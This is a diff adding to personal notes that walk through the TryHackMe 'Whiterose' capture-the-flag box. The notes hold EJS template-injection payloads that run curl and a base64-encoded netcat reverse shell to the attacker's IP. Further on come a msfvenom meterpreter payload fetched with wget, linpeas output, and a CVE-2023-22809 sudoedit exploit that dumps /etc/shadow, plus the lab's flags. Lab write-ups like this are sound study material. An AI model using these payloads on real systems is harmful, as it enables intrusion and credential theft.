@@ -174,3 +174,163 @@ Jemmy Laurel:
 - empty password parameter didnt change anything 
 - no password parameter did tho: <br>
 ![[WhiteroseNoPasswordParameter.png]]
+- hmmm i have no idea what this is. another tiiiiiiiiiiny looksie at the writeup 
+- hmmmm ejs something something template injection
+- gonna do some googling around
+	- https://github.com/mde/ejs/issues/720
+	- https://eslam.io/posts/ejs-server-side-template-injection-rce/
+	- sooooooooo ejs just takes the settings object and treats it like its own config no questions asked. we can do this two ways, setting the delimiter and doing some `<%__%>` block shenanigans. ooooooor we can just set a random option and make a second statement that runs 
+	- lets check if it actually runs or not by running something like 
+```js
+&settings[view%20options][outputFunctionName]=x%3bprocess.mainModule.require('child_process').execSync('curl%20http://10.21.154.145:8081');//
+```
+- 
+	- while an http server is open on my end on port `8081` <br>
+	![[WhiteroseHttpRequestGot.png]]
+	- WE GOT RCEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE
+	- FUCK YESSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS
+- lets get a revshell
+```js
+&settings[view%20options][outputFunctionName]=x%3bprocess.mainModule.require('child_process').execSync('bash -c "echo YnVzeWJveCBuYyAxMC4yMS4xNTQuMTQ1IDEzMzcgLWUgc2g= | base64 -d | bash"');//
+```
+<br>
+![[WhiteroseGotShell.png]]
+- HELLLLLLLLLLLLLLLLLLLL YEEAAAAAAAAAHHHHHHHHHHHH
+- `user.txt`:
+```
+THM{4lways_upd4te_uR_d3p3nd3nc!3s}
+```
+- `uname -a`:
+```sh
+Linux cyprusbank 4.15.0-213-generic #224-Ubuntu SMP Mon Jun 19 13:30:12 UTC 2023 x86_64 GNU/Linux
+```
+- imma try and get a [[meterpreter]] shell with a custom payload made with [[msfvenom]] 
+- `msfvenom -p linux/x64/meterpreter_reverse_tcp -f elf -o whiterose1338.elf LHOST=10.21.154.145 LPORT=1338`
+```sh fold title:"muhehehehe"
+cd /tmp
+wget http://10.21.154.145/whiterose1338.elf
+wget http://10.21.154.145:8082/whiterose1338.elf
+ls
+snap-private-tmp
+systemd-private-38a8eb192b424a1a93b01b8ce4a57ed9-systemd-resolved.service-CKb0ZT
+systemd-private-38a8eb192b424a1a93b01b8ce4a57ed9-systemd-timesyncd.service-R7AHJs
+whiterose1338.elf
+```
+- gave it 777 perms as well
+- set up a handler in [[metasploit]] <br>
+![[WhiteroseMeterpreterSession.png]]
+- HEH
+- uploaded [[linpeas.sh]] and ran it 
+- oooh red and yellowwwwwwwww: <br>
+![[WhiterosePossiblePrivEscVector1.png]]
+```
+╔══════════╣ PATH                  
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-path-abuses
+/home/web/.nvm/versions/node/v17.9.1/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/system/bin:/system/sbin:/system/xbin
+```
+<br> ![[WhiterosePossiblePrivEscVector2.png]]
+```sh
+╔══════════╣ Analyzing .service files
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#services
+/etc/systemd/system/multi-user.target.wants/pm2-web.service is calling this writable executable: /home/web/
+/etc/systemd/system/multi-user.target.wants/pm2-web.service is calling this writable executable: /home/web/
+/etc/systemd/system/multi-user.target.wants/pm2-web.service is calling this writable executable: /home/web/
+/etc/systemd/system/pm2-web.service is calling this writable executable: /home/web/
+/etc/systemd/system/pm2-web.service is calling this writable executable: /home/web/
+/etc/systemd/system/pm2-web.service is calling this writable executable: /home/web/
+```
+- another interesting thing: <br>
+![[WhiterosePossiblePrivEscVector3.png]]
+```sh
+╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid
+Matching Defaults entries for web on cyprusbank:
+    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH", secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass
+
+User web may run the following commands on cyprusbank:
+    (root) NOPASSWD: sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
+```
+- SUID stuff:
+```sh
+╔══════════╣ SUID - Check easy privesc, exploits and write perms
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid                                                             
+-rwsr-xr-x 1 root root 43K Sep 16  2020 /bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8                                     
+-rwsr-xr-x 1 root root 31K Aug 11  2016 /bin/fusermount
+-rwsr-xr-x 1 root root 44K Nov 29  2022 /bin/su
+-rwsr-xr-x 1 root root 27K Sep 16  2020 /bin/umount  --->  BSD/Linux(08-1996)
+-rwsr-xr-x 1 root root 63K Jun 28  2019 /bin/ping
+-rwsr-sr-x 1 daemon daemon 51K Feb 20  2018 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
+-rwsr-xr-x 1 root root 19K Jun 28  2019 /usr/bin/traceroute6.iputils
+-rwsr-xr-x 1 root root 37K Nov 29  2022 /usr/bin/newgidmap
+-rwsr-xr-x 1 root root 59K Nov 29  2022 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
+-rwsr-xr-x 1 root root 1.1M Nov  4  2022 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
+-rwsr-xr-x 1 root root 75K Nov 29  2022 /usr/bin/gpasswd
+-rwsr-xr-x 1 root root 22K Jan 12  2022 /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)/Generic_CVE-2021-4034
+-rwsr-xr-x 1 root root 40K Nov 29  2022 /usr/bin/newgrp  --->  HP-UX_10.20
+-rwsr-xr-x 1 root root 75K Nov 29  2022 /usr/bin/chfn  --->  SuSE_9.3/10
+-rwsr-xr-x 1 root root 37K Nov 29  2022 /usr/bin/newuidmap
+-rwsr-xr-x 1 root root 44K Nov 29  2022 /usr/bin/chsh
+-rwsr-xr-x 1 root root 10K Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
+-rwsr-xr-x 1 root root 99K May  5  2023 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+-rwsr-xr-- 1 root messagebus 42K Oct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x 1 root root 427K Mar 30  2022 /usr/lib/openssh/ssh-keysign
+-rwsr-xr-x 1 root root 14K Jan 12  2022 /usr/lib/policykit-1/polkit-agent-helper-1
+-rwsr-xr-x 1 root root 128K May 29  2023 /usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)
+```
+- gonna try `CVE-2019-13272` : https://github.com/jas502n/CVE-2019-13272?tab=readme-ov-file
+- uploaded https://github.com/jas502n/CVE-2019-13272/CVE-2019-13272.c to the victim 
+- ran `gcc -s CVE-2019-13272.c -o pwned` to compile to `pwned`: <br>
+![[WhiterosePwnedHasBeenGenerated.png]]
+- didnt work 
+- gonna upload `pspy64`
+- didnt find anything 
+- what do i still have in my backpocket?
+	- that sudo edit thing 
+	- that other thing 
+- lets google those 
+- found something for the sudoedit thing. `CVE-2023-22809`
+	- `In Sudo before 1.9.12p2, the sudoedit (aka -e) feature mishandles extra arguments passed in the user-provided environment variables (SUDO_EDITOR, VISUAL, and EDITOR), allowing a local attacker to append arbitrary entries to the list of files to process. This can lead to privilege escalation. Affected versions are 1.8.0 through 1.9.12.p1. The problem exists because a user-specified editor may contain a "--" argument that defeats a protection mechanism, e.g., an EDITOR='vim -- /path/to/extra/file' value.` <br>
+	- `sudo --version` <br>
+	- `Sudo version 1.9.12p1`
+	- OMG its vulnerable 
+	- https://www.vicarius.io/vsociety/posts/cve-2023-22809-sudoedit-bypass-analysis
+	- `export EDITOR="vi -- /etc/shadow"` <br>
+	- `sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm` 
+- output: 
+```sh
+root:$6$LVAc0zJV$81N7Ge4HhMb/U9A/kaL6Px0vay4rEKfNnrZSVbktE2aQxM6Tudl1/ex6tJq6fYFF
+PiOg7WhINFagng4ryejN8e1:19554:0:99999:7:::
+daemon:*:18885:0:99999:7:::
+bin:*:18885:0:99999:7:::
+sys:*:18885:0:99999:7:::
+sync:*:18885:0:99999:7:::
+games:*:18885:0:99999:7:::
+man:*:18885:0:99999:7:::
+lp:*:18885:0:99999:7:::
+mail:*:18885:0:99999:7:::
+news:*:18885:0:99999:7:::
+uucp:*:18885:0:99999:7:::
+proxy:*:18885:0:99999:7:::
+www-data:*:18885:0:99999:7:::
+backup:*:18885:0:99999:7:::
+list:*:18885:0:99999:7:::
+irc:*:18885:0:99999:7:::
+gnats:*:18885:0:99999:7:::
+nobody:*:18885:0:99999:7:::
+systemd-network:*:18885:0:99999:7:::
+systemd-resolve:*:18885:0:99999:7:::
+syslog:*:18885:0:99999:7:::
+messagebus:*:18885:0:99999:7:::
+"/var/tmp/shadow.fwMgThT5" 31L, 1052C                         1,1           Top
+```
+- ah fuck it imma get a tty shell instead
+- `nc -nvlp 1337`
+- [[python-tty-shell]]
+- `^Z`
+- `stty raw -echo && fg`
+- finally i can work in peace now 
+- `root.txt`
+```
+THM{4nd_uR_p4ck4g3s}
+```
+- edit the sudoers file to get full sudo and then just do sudo su to get full root 
